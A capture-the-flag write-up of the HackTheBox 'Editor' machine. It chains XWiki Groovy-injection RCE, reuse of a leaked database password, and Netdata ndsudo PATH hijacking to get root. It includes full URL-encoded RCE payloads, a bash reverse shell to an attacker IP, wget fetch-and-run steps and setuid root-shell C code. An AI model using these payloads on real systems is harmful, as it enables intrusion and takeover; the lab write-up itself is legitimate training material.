# HackTheBox - Editor Writeup

## Initial Reconnaissance

### Nmap Scan
```bash
nmap -Pn -p22,80,8080 -sC -sV 10.10.11.80
```

**Results:**
- **Port 22**: SSH (OpenSSH 8.9p1)
- **Port 80**: nginx 1.18.0 (Ubuntu) - "Editor - SimplistCode Pro"
- **Port 8080**: Jetty 10.0.20 with XWiki
  - WebDAV enabled (PROPFIND, LOCK, UNLOCK methods)
  - Redirects to `/xwiki/bin/view/Main/`

### Key Findings
- XWiki application running on port 8080
- WebDAV capabilities present
- Hosts file reveals: `editor.htb`, `wiki.editor.htb`

## Initial Access - XWiki RCE

### Vulnerability: CVE-2025-24893
XWiki Platform 15.10.10 suffers from a critical Remote Code Execution vulnerability in the SolrSearch endpoint, allowing guest users to execute arbitrary Groovy code.

### How the Vulnerability Works

**The SolrSearch Endpoint Flaw:**
XWiki's SolrSearch functionality processes user input through a Groovy template engine without proper sanitization. The vulnerability exists in how XWiki handles the `text` parameter when generating RSS feeds.

**Groovy Code Injection Mechanism:**
1. **Template Processing:** XWiki uses Groovy templates to dynamically generate content
2. **Insufficient Sanitization:** The `text` parameter gets processed directly by the Groovy engine
3. **Escape Sequence:** Using `}}}` we can break out of the current context
4. **Code Execution:** `{{groovy}}` tags allow arbitrary Groovy code execution
5. **Command Execution:** Groovy's `.execute()` method runs system commands

**Payload Structure Breakdown:**
```
%7D%7D%7D = }}} (breaks out of current template context)
%7B%7Basync%20async%3Dfalse%7D%7D = {{async async=false}} (sets execution context)
%7B%7Bgroovy%7D%7D = {{groovy}} (starts Groovy code block)
println(%22whoami%22.execute().text) = println("whoami".execute().text)
%7B%7B%2Fgroovy%7D%7D = {{/groovy}} (ends Groovy code block)
%7B%7B%2Fasync%7D%7D = {{/async}} (ends async context)
```

### Exploitation Strategy

**Why File Download Over Direct Injection:**
Direct command injection through URL parameters has several limitations:
- **URL Encoding Complexity:** Special characters get mangled in HTTP requests
- **Length Restrictions:** URLs have practical length limits
- **Character Restrictions:** Some shells and special characters don't survive the encoding process
- **Reliability Issues:** Complex payloads often fail due to encoding/decoding mismatches

**File Download Approach Benefits:**
- **Clean Execution:** Simple commands like `wget` are reliable
- **Complex Payloads:** Can download and execute sophisticated scripts
- **No Encoding Issues:** The actual payload isn't URL-encoded
- **Flexibility:** Easy to modify payloads without changing the injection vector

**Step 1: Create shell script locally:**
```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.12/4444 0>&1
```

**Step 2: Host HTTP server:**
```bash
python3 -m http.server 80
```

**Step 3: Download and execute via XWiki:**
```bash
# Download shell script
http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln("wget%20-qO%20/tmp/shell.sh%20http://10.10.14.12/shell.sh".execute().text)%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D

# Make executable
http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln("chmod%20+x%20/tmp/shell.sh".execute().text)%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D

# Execute
http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln("/tmp/shell.sh".execute().text)%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D
```

**Result:** Shell as `xwiki` user

## Lateral Movement - Database Credentials

### XWiki Configuration Discovery
```bash
find /var/lib/xwiki -name "hibernate.cfg.xml" 2>/dev/null
cat /var/lib/xwiki/data/hibernate.cfg.xml
```

**Found credentials:**
- Username: `xwiki`
- Password: `theEd1t0rTeam99`

### SSH Access
The database password works for SSH access:
```bash
ssh oliver@editor.htb
# Password: theEd1t0rTeam99
```

**Note:** While `su oliver` failed from the xwiki shell, SSH login worked due to different PAM authentication configurations.

## Privilege Escalation - Netdata SUID Exploitation

### Vulnerability: CVE-2024-32019 (GHSA-pmhq-4cxq-wj93)
Netdata v1.45.2 contains a local privilege escalation vulnerability in the `ndsudo` binary via untrusted search path.

### Discovery
```bash
find / -perm -4000 2>/dev/null | grep netdata
# Found: /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo (SUID root)

/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo --help
```

### Understanding the SUID Path Manipulation Vulnerability

**How ndsudo Works:**
The `ndsudo` binary is designed to allow Netdata to run specific privileged commands safely. It:
1. **Maintains a whitelist** of allowed command names (nvme, megacli, arcconf)
2. **Uses PATH environment variable** to locate executables
3. **Executes commands with root privileges** (due to SUID bit)

**The Security Flaw:**
The vulnerability exists because `ndsudo` trusts the `PATH` environment variable provided by the user:
1. **PATH Traversal:** User controls where ndsudo looks for executables
2. **No Absolute Paths:** ndsudo doesn't use hardcoded paths to binaries
3. **First Match Wins:** The first executable found in PATH gets executed
4. **Privilege Inheritance:** The malicious executable inherits root privileges

**Attack Vector:**
```
1. User creates malicious 'nvme' executable in /tmp
2. User modifies PATH to include /tmp first: PATH=/tmp:$PATH
3. ndsudo searches PATH for 'nvme' executable
4. ndsudo finds /tmp/nvme (our malicious binary) first
5. ndsudo executes /tmp/nvme with root privileges
6. Malicious binary runs as root and spawns shell
```

### Critical Exploitation Detail: Why C Program vs Bash Script

**This exploitation requires a compiled C program, not a shell script. Understanding why is crucial:**

#### The SUID Execution Model:
When a SUID binary executes another program, the target program can inherit elevated privileges, but this depends on how the program is structured.

#### Why Shell Scripts Fail:
1. **Security Policy Enforcement:** Modern Unix systems have security policies that **automatically drop SUID privileges** when executing shell scripts
2. **Interpreter Protection:** The shell interpreter (bash, sh) has built-in protections that detect SUID context and refuse to escalate privileges
3. **Historical Security Issues:** Shell scripts were historically abused for privilege escalation, so systems now block this attack vector
4. **Process Execution Chain:** When ndsudo executes a shell script, the privilege escalation gets blocked at the shell interpreter level

#### Why C Programs Succeed:
1. **Direct System Calls:** Compiled C programs can make direct system calls (`setuid()`, `setgid()`) without an interpreter
2. **Process Inheritance:** The C program directly inherits the SUID context from ndsudo
3. **No Interpreter Barrier:** There's no shell interpreter to block privilege escalation
4. **Explicit Privilege Setting:** The `setuid(0)` and `setgid(0)` calls explicitly set the process to run as root

#### Technical Deep Dive:
```c
setuid(0);  // Sets both real and effective user ID to 0 (root)
setgid(0);  // Sets both real and effective group ID to 0 (root)
execl("/bin/bash", "bash", "-i", NULL);  // Spawns interactive bash as root
```

**The execution flow:**
1. ndsudo (running as root due to SUID) executes our C program
2. Our C program inherits root privileges from ndsudo
3. `setuid(0)` makes the process fully root (not just effective UID)
4. `execl()` replaces our program with bash, maintaining root privileges
5. Result: Interactive bash shell running as root

**Why the system calls work:**
- The process already has **effective root privileges** from ndsudo
- `setuid(0)` succeeds because we have permission to change to root
- No interpreter security policies interfere with compiled binary execution

### Exploitation Steps

1. **Create malicious C program locally:**
```c
// malicious.c
#include <unistd.h>
#include <stdlib.h>
int main() {
  setuid(0);   // Set real user ID to root
  setgid(0);   // Set real group ID to root
  execl("/bin/bash", "bash", "-i", NULL);
  return 0;
}
```

2. **Compile and serve:**
```bash
gcc -o nvme malicious.c
python3 -m http.server 80
```

3. **Download and execute on target:**
```bash
cd /tmp
wget http://10.10.14.12/nvme
chmod +x nvme
export PATH=/tmp:$PATH
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```

**Result:** Root shell

### Technical Details
- `ndsudo` searches for executables using the `PATH` environment variable
- By placing our malicious `nvme` binary in `/tmp` and prepending `/tmp` to `PATH`
- When `ndsudo nvme-list` executes, it finds our fake `nvme` instead of the real one
- Our C program runs with SUID root privileges and properly escalates to root

## Lessons Learned

1. **File Download > Direct Injection:** Complex payloads should be downloaded rather than URL-encoded
2. **PAM Differences:** SSH and `su` may use different authentication backends
3. **SUID Exploitation:** Always use compiled C programs for reliable SUID privilege escalation
4. **Path Manipulation:** SUID binaries that use `PATH` are prime targets for privilege escalation

## Flags

- **User Flag:** `/home/oliver/user.txt`
- **Root Flag:** `/root/root.txt`

## Timeline

1. Nmap scan reveals XWiki on port 8080
2. XWiki RCE (CVE-2025-24893) → `xwiki` user shell
3. Database credentials found in hibernate.cfg.xml
4. SSH as `oliver` using database password
5. Netdata SUID exploitation (CVE-2024-32019) → root shell

## IOCs

- XWiki version 15.10.10 (vulnerable to CVE-2025-24893)
- Netdata version 1.45.2 (vulnerable to CVE-2024-32019)
- Password reuse: database credentials used for SSH access
- SUID binaries in `/opt/netdata/usr/libexec/netdata/plugins.d/`
